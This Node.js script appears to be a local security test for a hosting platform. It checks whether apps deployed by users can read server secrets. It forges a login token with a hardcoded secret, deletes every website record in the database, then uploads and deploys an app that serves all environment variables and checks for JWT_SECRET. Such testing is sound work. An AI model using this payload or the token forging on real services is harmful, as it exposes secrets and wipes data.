const fs = require('fs');
const axios = require('axios');
const mysql = require('mysql2/promise');
const jwt = require('jsonwebtoken');
const FormData = require('form-data');

(async () => {
    try {
        const pool = mysql.createPool({ host: 'localhost', user: 'deployly', password: 'Deployly@123', database: 'deployly' });
        const [users] = await pool.query('SELECT id, email FROM users LIMIT 1');
        const user = users[0];
        const token = jwt.sign({ id: user.id, email: user.email }, 'production_secret_key_123!', { expiresIn: '1h' });
        
        const api = axios.create({
            baseURL: 'http://localhost:3000/api',
            headers: { Authorization: 'Bearer ' + token },
            validateStatus: () => true
        });

        // Delete all old websites
        await pool.query('DELETE FROM websites');

        const [res] = await pool.query("INSERT INTO websites (user_id, name, domain, type, status, created_at) VALUES (?, 'Malicious', 'leak.com', 'node', 'pending', NOW())", [user.id]);
        const wId = res.insertId;

        // Create malicious zip
        const archiver = require('archiver');
        const output = fs.createWriteStream('tests/leak.zip');
        const archive = archiver('zip');
        
        const p = new Promise(r => output.on('close', r));
        archive.pipe(output);
        
        archive.append('const http = require("http"); http.createServer((req, res) => { res.end(JSON.stringify(process.env)); }).listen(process.env.PORT);', { name: 'app.js' });
        archive.append('{"name": "leak", "scripts": {"start": "node app.js"}}', { name: 'package.json' });
        
        await archive.finalize();
        await p;

        const form = new FormData();
        form.append('zipFile', fs.createReadStream('tests/leak.zip'));
        const uploadRes = await api.post(`/websites/${wId}/upload`, form, { headers: form.getHeaders() });
        console.log('Upload Status:', uploadRes.status);
        console.log('Upload Data:', uploadRes.data);
        
        // Wait for deploy
        await new Promise(r => setTimeout(r, 6000));
        
        // Check health
        const [w] = await pool.query('SELECT allocated_port FROM websites WHERE id = ?', [wId]);
        const port = w[0].allocated_port;
        console.log('Allocated Port:', port);
        
        if (port) {
            const fetchRes = await axios.get('http://127.0.0.1:' + port);
            console.log('Env keys leaked:', Object.keys(fetchRes.data));
            if (fetchRes.data.JWT_SECRET) console.log('JWT_SECRET LEAKED!');
        }
        
        process.exit(0);
    } catch(err) {
        console.error(err.message);
    }
})();
